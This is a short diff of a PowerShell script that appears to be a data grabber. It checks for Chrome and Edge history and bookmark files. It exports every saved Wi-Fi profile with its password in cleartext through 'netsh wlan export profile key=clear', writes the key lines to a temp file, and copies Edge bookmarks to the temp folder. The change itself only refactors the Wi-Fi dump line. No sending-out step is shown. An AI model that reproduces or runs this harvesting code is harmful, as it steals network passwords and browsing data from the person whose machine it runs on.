@@ -18,7 +18,8 @@ $chrome = Test-Path -Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Dat
 $edge = Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/History" -PathType Leaf
 $chromebook = Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf
 $edgebook = Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf
-netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial'> $env:tmp/wifi.txt
+$wifi = "$env:tmp/wifi.txt"
+netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | Out-File -FilePath $wifi
 if ($edgebook -eq $true){
 $edgbook = "$env:USERNAME-edge_bookmarks.txt"
 Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$env:tmp/$edgbook"}
